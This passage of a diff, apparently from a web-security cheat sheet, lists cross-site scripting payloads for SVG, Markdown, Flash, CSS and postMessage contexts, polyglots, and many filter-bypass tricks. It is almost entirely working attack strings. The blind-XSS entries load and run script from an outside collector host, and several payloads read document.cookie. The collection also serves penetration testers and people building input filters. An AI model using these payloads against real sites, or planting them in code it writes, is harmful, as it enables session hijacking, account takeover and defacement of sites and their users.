+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">desc</span>&gt;</span>&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span>
+&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">foreignObject</span>&gt;</span>&lt;![CDATA[&lt;/foreignObject&gt;</span><span class="xml">&lt;script&gt;alert(2)&lt;/script&gt;</span>]]&gt;<span class="xml">&lt;/svg&gt;</span>
+&lt;svg&gt;<span class="xml">&lt;title&gt;&lt;![CDATA[&lt;/title&gt;</span><span class="xml">&lt;script&gt;alert(3)&lt;/script&gt;</span>]]&gt;<span class="xml">&lt;/svg&gt;</span>
+</code></pre>
+<h3 id="xss-in-markdown">XSS in Markdown</h3>
+<pre><code class="lang-csharp">[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;<span class="hljs-keyword">throw</span>%<span class="hljs-number">201</span>)
+</code></pre>
+<h3 id="xss-in-swf-flash-application">XSS in SWF flash application</h3>
+<pre><code class="lang-powershell">Browsers other than IE: http://<span class="hljs-number">0</span>me.me/demo/xss/xssproject.swf?js=alert(document.domain);
+IE8: http://<span class="hljs-number">0</span>me.me/demo/xss/xssproject.swf?js=<span class="hljs-keyword">try</span>{alert(document.domain)}<span class="hljs-keyword">catch</span>(e){ window.open(&#x2018;?js=history.go(-<span class="hljs-number">1</span>)&#x2019;,&#x2019;_self&#x2019;);}
+IE9: http://<span class="hljs-number">0</span>me.me/demo/xss/xssproject.swf?js=w=window.open(&#x2018;invalidfileinvalidfileinvalidfile&#x2019;,&#x2019;target&#x2019;);setTimeout(&#x2018;alert(w.document.location);w.close();&#x2019;,<span class="hljs-number">1</span>);
+</code></pre>
+<p>more payloads in ./files</p>
+<h3 id="xss-in-swf-flash-application">XSS in SWF flash application</h3>
+<pre><code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\&quot;))} catch(e) {alert(1);}//&amp;width=1000&amp;height=1000
+swfupload.swf?movieName=&quot;]);}catch(e){}if(!self.a)self.a=!alert(1);//
+swfupload.swf?buttonText=test&lt;a href=&quot;javascript:confirm(1)&quot;&gt;&lt;img src=&quot;https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg&quot;/&gt;&lt;/a&gt;&amp;.swf
+plupload.flash.swf?%#target%g=alert&amp;uid%g=XSS&amp;
+moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\&quot;));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b&apos;%20XSSed!&apos;%29
+bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
+flashcanvas.swf?id=test\&quot;));}catch(e){alert(document.domain)}//
+phpmyadmin/js/canvg/flashcanvas.swf?id=test\&#x201D;));}catch(e){alert(document.domain)}//
+</code></pre><h3 id="xss-in-css">XSS in CSS</h3>
+<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
+<span class="hljs-selector-tag">div</span>  {
+    <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;data:image/jpg;base64,&lt;\/style&gt;&lt;svg/onload=alert(document.domain)&gt;&quot;</span>);
+    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#cccccc</span>;
+}
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>lol<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<h2 id="xss-in-postmessage">XSS in PostMessage</h2>
+<blockquote>
+<p>If the target origin is asterisk * the message can be sent to any domain has reference to the child page.</p>
+</blockquote>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">button</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Click Me&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;btn&apos;</span>).onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)</span>{
+    <span class="hljs-built_in">window</span>.poc = <span class="hljs-built_in">window</span>.open(<span class="hljs-string">&apos;http://www.redacted.com/#login&apos;</span>);
+    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+        <span class="hljs-built_in">window</span>.poc.postMessage(
+            {
+                <span class="hljs-string">&quot;sender&quot;</span>: <span class="hljs-string">&quot;accounts&quot;</span>,
+                <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;javascript:confirm(&apos;XSS&apos;)&quot;</span>,
+            },
+            <span class="hljs-string">&apos;*&apos;</span>
+        );
+    }, <span class="hljs-number">2000</span>);
+}
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<h2 id="blind-xss">Blind XSS</h2>
+<h3 id="xss-hunter">XSS Hunter</h3>
+<p>Available at <a href="https://xsshunter.com/app" target="_blank">https://xsshunter.com/app</a></p>
+<blockquote>
+<p>XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.</p>
+</blockquote>
+<pre><code class="lang-javascript">&quot;&gt;&lt;script src=//yoursubdomain.xss.ht&gt;&lt;/script&gt;
+
+javascript:eval(&apos;var a=document.createElement(\&apos;script\&apos;);a.src=\&apos;https://yoursubdomain.xss.ht\&apos;;document.body.appendChild(a)&apos;)
+
+&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//yoursubdomain.xss.ht&quot;);a.send();&lt;/script&gt;
+
+&lt;script&gt;$.getScript(&quot;//yoursubdomain.xss.ht&quot;)&lt;/script&gt;
+</code></pre>
+<h3 id="other-blind-xss-tools">Other Blind XSS tools</h3>
+<ul>
+<li><a href="https://github.com/Netflix-Skunkworks/sleepy-puppy" target="_blank">sleepy-puppy - Netflix</a></li>
+<li><a href="https://github.com/LewisArdern/bXSS" target="_blank">bXSS - LewisArdern</a></li>
+<li><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank">BlueLotus_XSSReceiver - FiresunCN</a></li>
+<li><a href="https://github.com/ssl/ezXSS" target="_blank">ezXSS - ssl</a></li>
+</ul>
+<h3 id="blind-xss-endpoint">Blind XSS endpoint</h3>
+<ul>
+<li>Contact forms</li>
+<li>Ticket support</li>
+<li>Referer Header<ul>
+<li>Custom Site Analytics</li>
+<li>Administrative Panel logs</li>
+</ul>
+</li>
+</ul>
+<h2 id="polyglot-xss">Polyglot XSS</h2>
+<p>Polyglot XSS - 0xsobky</p>
+<pre><code class="lang-javascript">jaVasCript:<span class="hljs-comment">/*-<span class="hljs-comment">/*`<span class="hljs-comment">/*\`<span class="hljs-comment">/*&apos;<span class="hljs-comment">/*&quot;<span class="hljs-comment">/**/</span>(<span class="hljs-comment">/* */</span>oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+</span></span></span></span></span></code></pre>
+<p>Polyglot XSS - Ashar Javed</p>
+<pre><code class="lang-javascript"><span class="hljs-string">&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot;</span> &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&apos;--&gt;&quot; &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;img/id=&quot;confirm&amp;lpar; 1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&apos;&quot;&gt;&lt;img src=&quot;http: //i.imgur.com/P8mL8.jpg&quot;&gt;
+</code></pre>
+<p>Polyglot XSS - Mathias Karlsson</p>
+<pre><code class="lang-javascript">&quot; onclick=alert(1)//&lt;button &#x2018; onclick=alert(1)//&gt; */ alert(1)//
+</code></pre>
+<p>Polyglot XSS - Rsnake</p>
+<pre><code class="lang-javascript"><span class="hljs-string">&apos;;alert(String.fromCharCode(88,83,83))//&apos;</span>;alert(<span class="hljs-built_in">String</span>. fromCharCode(<span class="hljs-number">88</span>,<span class="hljs-number">83</span>,<span class="hljs-number">83</span>))<span class="hljs-comment">//&quot;;alert(String.fromCharCode (88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;</span>
+</code></pre>
+<p>Polyglot XSS - Daniel Miessler</p>
+<pre><code class="lang-javascript">&apos;;alert(String.fromCharCode(88,83,83))//&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+&#x201C; onclick=alert(1)//&lt;button &#x2018; onclick=alert(1)//&gt; */ alert(1)//
+&apos;&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot;&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&apos;--&gt;&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;img/id=&quot;confirm&amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&apos;&quot;&gt;&lt;img src=&quot;http://i.imgur.com/P8mL8.jpg&quot;&gt;
+javascript://&apos;/&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;--&gt;&lt;p&quot; onclick=alert()//&gt;*/alert()/*
+javascript://--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&quot;/&lt;/textarea&gt;*/&lt;alert()/*&apos; onclick=alert()//&gt;a
+javascript://&lt;/title&gt;&quot;/&lt;/script&gt;&lt;/style&gt;&lt;/textarea/--&gt;*/&lt;alert()/*&apos; onclick=alert()//&gt;/
+javascript://&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;--&gt;&lt;/script&gt;&lt;a&quot;//&apos; onclick=alert()//&gt;*/alert()/*
+javascript://&apos;//&quot; --&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/script&gt;&lt;/title&gt;&lt;b onclick= alert()//&gt;*/alert()/*
+javascript://&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/script --&gt;&lt;li &apos;//&quot; &apos;*/alert()/*&apos;, onclick=alert()//
+javascript:alert()//--&gt;&lt;/script&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/title&gt;&lt;a&quot;//&apos; onclick=alert()//&gt;*/alert()/*
+--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&quot;/&lt;/textarea&gt;&lt;a&apos; onclick=alert()//&gt;*/alert()/*
+/&lt;/title/&apos;/&lt;/style/&lt;/script/&lt;/textarea/--&gt;&lt;p&quot; onclick=alert()//&gt;*/alert()/*
+javascript://--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;svg &quot;//&apos; onclick=alert()//
+/&lt;/title/&apos;/&lt;/style/&lt;/script/--&gt;&lt;p&quot; onclick=alert()//&gt;*/alert()/*
+</code></pre>
+<p>Polyglot XSS - <a href="https://twitter.com/s0md3v/status/966175714302144514" target="_blank">@s0md3v</a>
+<img src="https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg" alt="https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg"></p>
+<pre><code class="lang-javascript">--&gt;&apos;&quot;/&gt;&lt;/sCript&gt;&lt;svG x=&quot;&gt;&quot; onload=(co\u006efirm)``&gt;
+</code></pre>
+<p><img src="https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large" alt="https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large"></p>
+<pre><code class="lang-javascript">&lt;svg%<span class="hljs-number">0</span>Ao%<span class="hljs-number">00</span>nload=%<span class="hljs-number">09</span>((pro\u006dpt))()<span class="hljs-comment">//</span>
+</code></pre>
+<p>Polyglot XSS - from <a href="http://polyglot.innerht.ml" target="_blank">@filedescriptor&apos;s Polyglot Challenge</a></p>
+<pre><code class="lang-javascript"># by crlf
+javascript:&quot;/*&apos;/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \&quot; onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;
+
+# by europa
+javascript:&quot;/*&apos;/*`/*\&quot; /*&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/script/--&gt;&amp;lt;svg/onload=/*&lt;html/*/onmouseover=alert()//&gt;
+
+# by EdOverflow
+javascript:&quot;/*\&quot;/*`/*&apos; /*&lt;/template&gt;&lt;/textarea&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/style&gt;&lt;/script&gt;--&gt;&amp;lt;svg onload=/*&lt;html/*/onmouseover=alert()//&gt;
+
+# by h1/ragnar
+javascript:`//&quot;//\&quot;//&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;/template&gt;&amp;lt;svg/onload=&apos;/*--&gt;&lt;html */ onmouseover=alert()//&apos;&gt;`
+</code></pre>
+<h2 id="filter-bypass-and-exotic-payloads">Filter Bypass and exotic payloads</h2>
+<h3 id="bypass-case-sensitive">Bypass case sensitive</h3>
+<pre><code class="lang-javascript">&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;
+</code></pre>
+<h3 id="bypass-tag-blacklist">Bypass tag blacklist</h3>
+<pre><code class="lang-javascript">&lt;script x&gt;
+&lt;script x&gt;alert(&apos;XSS&apos;)&lt;script y&gt;
+</code></pre>
+<h3 id="bypass-word-blacklist-with-code-evaluation">Bypass word blacklist with code evaluation</h3>
+<pre><code class="lang-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&apos;ale&apos;</span>+<span class="hljs-string">&apos;rt(0)&apos;</span>);
+<span class="hljs-built_in">Function</span>(<span class="hljs-string">&quot;ale&quot;</span>+<span class="hljs-string">&quot;rt(1)&quot;</span>)();
+<span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span><span class="hljs-string">`al\ert\`6\``</span>;
+setTimeout(<span class="hljs-string">&apos;ale&apos;</span>+<span class="hljs-string">&apos;rt(2)&apos;</span>);
+setInterval(<span class="hljs-string">&apos;ale&apos;</span>+<span class="hljs-string">&apos;rt(10)&apos;</span>);
+<span class="hljs-built_in">Set</span>.constructor(<span class="hljs-string">&apos;ale&apos;</span>+<span class="hljs-string">&apos;rt(13)&apos;</span>)();
+<span class="hljs-built_in">Set</span>.constructor<span class="hljs-string">`al\x65rt\x2814\x29`</span><span class="hljs-string">``</span>;
+</code></pre>
+<h3 id="bypass-with-incomplete-html-tag">Bypass with incomplete html tag</h3>
+<p>Works on IE/Firefox/Chrome/Safari</p>
+<pre><code class="lang-javascript">&lt;img src=<span class="hljs-string">&apos;1&apos;</span> onerror=<span class="hljs-string">&apos;alert(0)&apos;</span> &lt;
+</code></pre>
+<h3 id="bypass-quotes-for-string">Bypass quotes for string</h3>
+<pre><code class="lang-javascript"><span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">88</span>,<span class="hljs-number">83</span>,<span class="hljs-number">83</span>)
+</code></pre>
+<h3 id="bypass-quotes-in-script-tag">Bypass quotes in script tag</h3>
+<pre><code class="lang-javascript">http://localhost/bla.php?test=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;html&gt;
+  &lt;script&gt;
+    &lt;?php echo &apos;foo=&quot;text &apos;.$_GET[&apos;test&apos;].&apos;&quot;;&apos;;`?&gt;
+  &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="bypass-quotes-in-mousedown-event">Bypass quotes in mousedown event</h3>
+<p>You can bypass a single quote with &apos; in an on mousedown event handler</p>
+<pre><code class="lang-javascript">&lt;a href=&quot;&quot; onmousedown=&quot;var name = &apos;&amp;#39;;alert(1)//&apos;; alert(&apos;smthg&apos;)&quot;&gt;Link&lt;/a&gt;
+</code></pre>
+<h3 id="bypass-dot-filter">Bypass dot filter</h3>
+<pre><code class="lang-javascript">&lt;script&gt;window[&apos;alert&apos;](document[&apos;domain&apos;])&lt;/script&gt;
+</code></pre>
+<h3 id="bypass-parenthesis-for-string">Bypass parenthesis for string</h3>
+<pre><code class="lang-javascript">alert<span class="hljs-string">`1`</span>
+setTimeout<span class="hljs-string">`alert\u0028document.domain\u0029`</span>;
+</code></pre>
+<h3 id="bypass-parenthesis-and-semi-colon">Bypass parenthesis and semi colon</h3>
+<pre><code class="lang-javascript">// From @garethheyes
+&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;
+&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;
+&lt;script&gt;throw onerror=alert,&apos;some string&apos;,123,&apos;haha&apos;&lt;/script&gt;
+
+// From @terjanq 
+&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]&lt;/script&gt;
+
+// From @cgvwzq
+&lt;script&gt;TypeError.prototype.name =&apos;=/&apos;,0[onerror=eval][&apos;/-alert(1)//&apos;]&lt;/script&gt;
+</code></pre>
+<h3 id="bypass-onxxxx-blacklist">Bypass onxxxx= blacklist</h3>
+<pre><code class="lang-javascript">&lt;object onafterscriptexecute=confirm(<span class="hljs-number">0</span>)&gt;
+&lt;object onbeforescriptexecute=confirm(0)&gt;
+
+// Bypass onxxx= filter with a null byte/vertical tab
+&lt;img src=&apos;1&apos; onerror\x00=alert(0) /&gt;
+&lt;img src=&apos;1&apos; onerror\x0b=alert(0) /&gt;
+
+// Bypass onxxx= filter with a &apos;/&apos; 
+&lt;img src=&apos;1&apos; onerror/=alert(0) /&gt;
+</code></pre>
+<h3 id="bypass-space-filter">Bypass space filter</h3>
+<pre><code class="lang-javascript"><span class="hljs-comment">// Bypass space filter with &quot;/&quot;</span>
+&lt;img/src=<span class="hljs-string">&apos;1&apos;</span>/onerror=alert(<span class="hljs-number">0</span>)&gt;
+
+<span class="hljs-comment">// Bypass space filter with 0x0c/^L</span>
+&lt;svgonload=alert(<span class="hljs-number">1</span>)&gt;
+
+$ echo <span class="hljs-string">&quot;&lt;svg^Lonload^L=^Lalert(1)^L&gt;&quot;</span> | xxd
+<span class="hljs-number">00000000</span>: <span class="hljs-number">3</span>c73 <span class="hljs-number">7667</span> <span class="hljs-number">0</span>c6f <span class="hljs-number">6e6</span>c <span class="hljs-number">6</span>f61 <span class="hljs-number">640</span>c <span class="hljs-number">3</span>d0c <span class="hljs-number">616</span>c  &lt;svg.onload.=.al
+<span class="hljs-number">00000010</span>: <span class="hljs-number">6572</span> <span class="hljs-number">7428</span> <span class="hljs-number">3129</span> <span class="hljs-number">0</span>c3e <span class="hljs-number">0</span>a                   ert(<span class="hljs-number">1</span>).&gt;.
+</code></pre>
+<h3 id="bypass-email-filter">Bypass email filter</h3>
+<p>(<a href="http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate" target="_blank">RFC compliant</a>)</p>
+<pre><code class="lang-javascript"><span class="hljs-string">&quot;&gt;&lt;svg/onload=confirm(1)&gt;&quot;</span>@x.y
+</code></pre>
+<h3 id="bypass-document-blacklist">Bypass document blacklist</h3>
+<pre><code class="lang-javascript">&lt;div id = <span class="hljs-string">&quot;x&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">alert(x.parentNode.parentNode.parentNode.location)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+</code></pre>
+<h3 id="bypass-using-javascript-inside-a-string">Bypass using javascript inside a string</h3>
+<pre><code class="lang-javascript">&lt;script&gt;
+foo=<span class="hljs-string">&quot;text &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;
+<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+</code></pre>
+<h3 id="bypass-using-an-alternate-way-to-redirect">Bypass using an alternate way to redirect</h3>
+<pre><code class="lang-javascript">location=<span class="hljs-string">&quot;http://google.com&quot;</span>
+<span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;http://google.com&quot;</span>
+<span class="hljs-built_in">document</span>.location.href=<span class="hljs-string">&quot;http://google.com&quot;</span>
+<span class="hljs-built_in">window</span>.location.assign(<span class="hljs-string">&quot;http://google.com&quot;</span>)
+<span class="hljs-built_in">window</span>[<span class="hljs-string">&apos;location&apos;</span>][<span class="hljs-string">&apos;href&apos;</span>]=<span class="hljs-string">&quot;http://google.com&quot;</span>
+</code></pre>
+<h3 id="bypass-using-an-alternate-way-to-execute-an-alert">Bypass using an alternate way to execute an alert</h3>
+<p>From <a href="https://twitter.com/brutelogic/status/965642032424407040" target="_blank">@brutelogic</a> tweet.</p>
+<pre><code class="lang-javascript"><span class="hljs-built_in">window</span>[<span class="hljs-string">&apos;alert&apos;</span>](<span class="hljs-number">0</span>)
+parent[<span class="hljs-string">&apos;alert&apos;</span>](<span class="hljs-number">1</span>)
+self[<span class="hljs-string">&apos;alert&apos;</span>](<span class="hljs-number">2</span>)
+top[<span class="hljs-string">&apos;alert&apos;</span>](<span class="hljs-number">3</span>)
+<span class="hljs-keyword">this</span>[<span class="hljs-string">&apos;alert&apos;</span>](<span class="hljs-number">4</span>)
+frames[<span class="hljs-string">&apos;alert&apos;</span>](<span class="hljs-number">5</span>)
+content[<span class="hljs-string">&apos;alert&apos;</span>](<span class="hljs-number">6</span>)
+
+[<span class="hljs-number">7</span>].map(alert)
+[<span class="hljs-number">8</span>].find(alert)
+[<span class="hljs-number">9</span>].every(alert)
+[<span class="hljs-number">10</span>].filter(alert)
+[<span class="hljs-number">11</span>].findIndex(alert)
+[<span class="hljs-number">12</span>].forEach(alert);
+</code></pre>
+<p>From <a href="https://twitter.com/quanyang/status/1078536601184030721" target="_blank">@quanyang</a> tweet.</p>
+<pre><code class="lang-javascript">prompt<span class="hljs-string">`<span class="hljs-subst">${document.domain}</span>`</span>
+<span class="hljs-built_in">document</span>.location=<span class="hljs-string">&apos;java\tscript:alert(1)&apos;</span>
+<span class="hljs-built_in">document</span>.location=<span class="hljs-string">&apos;java\rscript:alert(1)&apos;</span>
+<span class="hljs-built_in">document</span>.location=<span class="hljs-string">&apos;java\tscript:alert(1)&apos;</span>
+</code></pre>
+<p>From <a href="https://twitter.com/404death/status/1011860096685502464" target="_blank">@404death</a> tweet.</p>
+<pre><code class="lang-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&apos;ale&apos;</span>+<span class="hljs-string">&apos;rt(0)&apos;</span>);
+<span class="hljs-built_in">Function</span>(<span class="hljs-string">&quot;ale&quot;</span>+<span class="hljs-string">&quot;rt(1)&quot;</span>)();
+<span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span><span class="hljs-string">`al\ert\`6\``</span>;
+
+<span class="hljs-keyword">constructor</span>.<span class="hljs-keyword">constructor</span>(&quot;aler&quot;+&quot;t(3)&quot;)();
+[].filter.<span class="hljs-keyword">constructor</span>(&apos;ale&apos;+&apos;rt(4)&apos;)();
+
+top[&quot;al&quot;+&quot;ert&quot;](5);
+top[8680439..toString(30)](7);
+top[/al/.source+/ert/.source](8);
+top[&apos;al\x65rt&apos;](9);
+
+open(&apos;java&apos;+&apos;script:ale&apos;+&apos;rt(11)&apos;);
+location=&apos;javascript:ale&apos;+&apos;rt(12)&apos;;
+
+setTimeout`alert\u0028document.domain\u0029`;
+setTimeout(&apos;ale&apos;+&apos;rt(2)&apos;);
+setInterval(&apos;ale&apos;+&apos;rt(10)&apos;);
+Set.<span class="hljs-keyword">constructor</span>(&apos;ale&apos;+&apos;rt(13)&apos;)();
+Set.<span class="hljs-keyword">constructor</span>`al\x65rt\x2814\x29```;
+</code></pre>
+<p>Bypass using an alternate way to trigger an alert</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> i = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;iframe&quot;</span>);
+i.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+  i.contentWindow.alert(<span class="hljs-number">1</span>);
+}
+<span class="hljs-built_in">document</span>.appendChild(i);
+
+<span class="hljs-comment">// Bypassed security</span>
+XSSObject.proxy = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">obj, name, report_function_name, exec_original</span>) </span>{
+      <span class="hljs-keyword">var</span> proxy = obj[name];
+      obj[name] = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{
+        <span class="hljs-keyword">if</span> (exec_original) {
+          <span class="hljs-keyword">return</span> proxy.apply(<span class="hljs-keyword">this</span>, <span class="hljs-built_in">arguments</span>);
+        }
+      };
+      XSSObject.lockdown(obj, name);
+  };
+XSSObject.proxy(<span class="hljs-built_in">window</span>, <span class="hljs-string">&apos;alert&apos;</span>, <span class="hljs-string">&apos;window.alert&apos;</span>, <span class="hljs-literal">false</span>);
+</code></pre>
+<h3 id="bypass--using-nothing">Bypass &quot;&gt;&quot; using nothing</h3>
+<p>You don&apos;t need to close your tags.</p>
+<pre><code class="lang-javascript">&lt;svg onload=alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span>
+</code></pre>
+<h3 id="bypass--using-another-character">Bypass &quot;;&quot; using another character</h3>
+<pre><code class="lang-javascript"><span class="hljs-string">&apos;te&apos;</span> * alert(<span class="hljs-string">&apos;*&apos;</span>) * <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> / alert(<span class="hljs-string">&apos;/&apos;</span>) / <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> % alert(<span class="hljs-string">&apos;%&apos;</span>) % <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> - alert(<span class="hljs-string">&apos;-&apos;</span>) - <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> + alert(<span class="hljs-string">&apos;+&apos;</span>) + <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> ^ alert(<span class="hljs-string">&apos;^&apos;</span>) ^ <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> &gt; alert(<span class="hljs-string">&apos;&gt;&apos;</span>) &gt; <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> &lt; alert(<span class="hljs-string">&apos;&lt;&apos;</span>) &lt; <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> == alert(<span class="hljs-string">&apos;==&apos;</span>) == <span class="hljs-string">&apos;xt&apos;</span>;
